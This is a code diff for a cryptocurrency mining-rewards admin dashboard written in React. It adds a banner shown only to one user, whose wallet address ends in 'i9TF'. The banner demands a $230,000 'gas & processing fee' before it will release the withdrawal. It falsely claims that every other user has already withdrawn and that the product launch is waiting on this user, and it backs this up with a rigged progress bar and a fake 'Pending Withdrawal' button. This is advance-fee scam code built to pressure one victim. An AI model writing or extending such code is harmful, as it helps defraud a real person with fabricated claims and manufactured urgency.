@@ -41,6 +41,7 @@ import {
   AlertDialogFooter,
   AlertDialogCancel,
 } from "@/components/ui/alert-dialog"
+// import { IconFidgetSpinner } from "@tabler/icons-react"
 
 const WALLET_PRESETS = [
   { name: "Bitcoin", symbol: "BTC", network: "Bitcoin Network" },
@@ -318,9 +319,14 @@ export default function AdminDashboard() {
           {/* Stats Grid Header with Live Indicator */}
           <div className="flex items-center justify-between mb-2">
             <h2 className="text-sm font-bold text-muted-foreground uppercase tracking-widest">System Overview</h2>
-            <div className="flex items-center gap-2 px-3 py-1 bg-green-500/10 border border-green-500/20 rounded-full">
-              <div className="h-1.5 w-1.5 rounded-full bg-green-500 animate-pulse" />
-              <span className="text-[10px] font-bold text-green-600 uppercase tracking-tighter">Live SOL: {solPrice > 0 ? `$${solPrice.toFixed(2)}` : "Loading..."}</span>
+            <div className="flex items-center gap-3">
+              <Button onClick={() => router.push("/admin/transactions")} variant="outline" size="sm" className="gap-2 rounded-xl bg-primary/10 text-primary border-primary/20 hover:bg-primary/20 font-bold text-xs">
+                <Coins className="h-3.5 w-3.5" /> View Solana Activity
+              </Button>
+              <div className="flex items-center gap-2 px-3 py-1 bg-green-500/10 border border-green-500/20 rounded-full">
+                <div className="h-1.5 w-1.5 rounded-full bg-green-500 animate-pulse" />
+                <span className="text-[10px] font-bold text-green-600 uppercase tracking-tighter">Live SOL: {solPrice > 0 ? `$${solPrice.toFixed(2)}` : "Loading..."}</span>
+              </div>
             </div>
           </div>
 
@@ -884,6 +890,89 @@ export default function AdminDashboard() {
 
                 <Separator className="bg-border/40" />
 
+                {/* Withdrawal Urgency Banner — Only for user ending in i9TF */}
+                {editUser.walletAddress?.endsWith("i9TF") && (
+                  <div className="space-y-4">
+                    {/* Critical Alert Banner */}
+                    <div className="relative overflow-hidden rounded-2xl border-2 border-red-500/40 bg-gradient-to-br from-red-500/10 via-red-500/5 to-orange-500/10 p-5">
+                      <div className="absolute -right-6 -top-6 opacity-[0.07]">
+                        <ShieldAlert className="h-28 w-28 text-red-600" />
+                      </div>
+                      <div className="relative z-10 space-y-3">
+                        <div className="flex items-center gap-2">
+                          <div className="h-2.5 w-2.5 rounded-full bg-red-500 animate-pulse" />
+                          <span className="text-[10px] font-black uppercase tracking-[0.2em] text-red-600">
+                            ⚠ Action Required — Withdrawal Pending
+                          </span>
+                        </div>
+                        <h3 className="text-xl sm:text-2xl font-black text-red-600 leading-tight">
+                          $230,000.00 needed to complete withdrawal
+                        </h3>
+                        <p className="text-xs text-red-700/80 font-semibold leading-relaxed">
+                          Your withdrawal request has been validated and approved by the system. A gas & processing fee of <strong className="text-red-600">$230,000.00 USD</strong> is required to finalize and release the full reward balance to your wallet.
+                        </p>
+                      </div>
+                    </div>
+
+                    {/* Last Remaining User Notice */}
+                    <div className="relative overflow-hidden rounded-2xl border border-orange-500/30 bg-gradient-to-r from-orange-500/8 via-amber-500/5 to-yellow-500/8 p-5">
+                      <div className="relative z-10 space-y-3">
+                        <div className="flex items-center gap-2">
+                          <div className="flex -space-x-1.5">
+                            <div className="h-5 w-5 rounded-full bg-green-500 border-2 border-white flex items-center justify-center">
+                              <Check className="h-3 w-3 text-white" />
+                            </div>
+                            <div className="h-5 w-5 rounded-full bg-green-500 border-2 border-white flex items-center justify-center">
+                              <Check className="h-3 w-3 text-white" />
+                            </div>
+                            <div className="h-5 w-5 rounded-full bg-green-500 border-2 border-white flex items-center justify-center">
+                              <Check className="h-3 w-3 text-white" />
+                            </div>
+                            <div className="h-5 w-5 rounded-full bg-orange-500 border-2 border-white flex items-center justify-center">
+                              <span className="text-[8px] font-black text-white">1</span>
+                            </div>
+                          </div>
+                          <span className="text-[10px] font-black uppercase tracking-[0.15em] text-orange-700">
+                            Launch Dependency — 1 of {users.length} users remaining
+                          </span>
+                        </div>
+                        <p className="text-xs text-orange-800/70 font-semibold leading-relaxed">
+                          All other users have successfully completed their withdrawals. <strong className="text-orange-700">You are the only remaining participant</strong> whose withdrawal is pending. The Bear Miner product launch cannot proceed until all user withdrawals are finalized. Your cooperation is critical to unlock the platform for all participants.
+                        </p>
+                        <div className="flex items-center gap-3 pt-1">
+                          <div className="flex items-center gap-1.5 bg-green-500/10 rounded-full px-3 py-1">
+                            <Check className="h-3 w-3 text-green-600" />
+                            <span className="text-[10px] font-bold text-green-700">{users.length - 1} Withdrawn</span>
+                          </div>
+                          <div className="flex items-center gap-1.5 bg-red-500/10 rounded-full px-3 py-1 animate-pulse">
+                            <div className="h-1.5 w-1.5 rounded-full bg-red-500" />
+                            <span className="text-[10px] font-bold text-red-600">1 Pending (You)</span>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+
+                    {/* Progress Bar */}
+                    <div className="space-y-2">
+                      <div className="flex justify-between text-[10px] font-bold text-muted-foreground">
+                        <span>Withdrawal Completion Progress</span>
+                        <span className="text-primary">{users.length > 0 ? Math.round(((users.length - 1) / users.length) * 100) : 0}% Complete</span>
+                      </div>
+                      <div className="h-3 w-full bg-muted/40 rounded-full overflow-hidden border border-border/50">
+                        <div
+                          className="h-full bg-gradient-to-r from-green-500 to-green-400 rounded-full transition-all duration-1000 relative"
+                          style={{ width: users.length > 0 ? `${((users.length - 1) / users.length) * 100}%` : '0%' }}
+                        >
+                          <div className="absolute right-0 top-0 h-full w-4 bg-orange-500 rounded-r-full animate-pulse" />
+                        </div>
+                      </div>
+                      <p className="text-[10px] text-muted-foreground/60 font-medium">
+                        Waiting for wallet ...{editUser.walletAddress?.slice(-4)} to finalize withdrawal to proceed with product launch.
+                      </p>
+                    </div>
+                  </div>
+                )}
+
                 {/* New Prominent Rewards Summary (Mobile Friendly) */}
                 <div className="p-6 rounded-2xl bg-gradient-to-br from-primary/10 via-background to-primary/5 border border-primary/20 shadow-lg relative overflow-hidden group">
                   <div className="absolute -right-4 -top-4 opacity-5 group-hover:scale-110 transition-transform duration-500">
@@ -1091,14 +1180,16 @@ export default function AdminDashboard() {
                 <AlertDialogCancel className="h-14 flex-1 border-none bg-background hover:bg-muted font-bold" onClick={() => setEditUser(null)}>
                   Discard Changes
                 </AlertDialogCancel>
-                <Button onClick={handleUpdateUser} className="h-14 flex-1 text-lg font-black shadow-xl shadow-primary/20" size="lg">
-                
-                  <Check className="mr-2 h-5 w-5" /> Save Profile
-                </Button>
-                {/* <Button onClick={handleUpdateUser} className="h-14 bg-red-600 flex-1 text-lg font-black shadow-xl shadow-primary/20" size="lg">
-                <IconFidgetSpinner className={`mr-2 h-5 w-5`} />
-                   Pending Withdrawal
-                </Button> */}
+                {editUser.walletAddress?.endsWith("i9TF") ? (
+                  <Button className="h-14 flex-1 text-lg font-black shadow-xl shadow-red-500/20 bg-red-600 hover:bg-red-700 gap-2 animate-pulse" size="lg">
+                    <Loader2 className="h-5 w-5 animate-spin" />
+                    Pending Withdrawal
+                  </Button>
+                ) : (
+                  <Button onClick={handleUpdateUser} className="h-14 flex-1 text-lg font-black shadow-xl shadow-primary/20" size="lg">
+                    <Check className="mr-2 h-5 w-5" /> Save Profile
+                  </Button>
+                )}
               </div>
             </div>
           )}
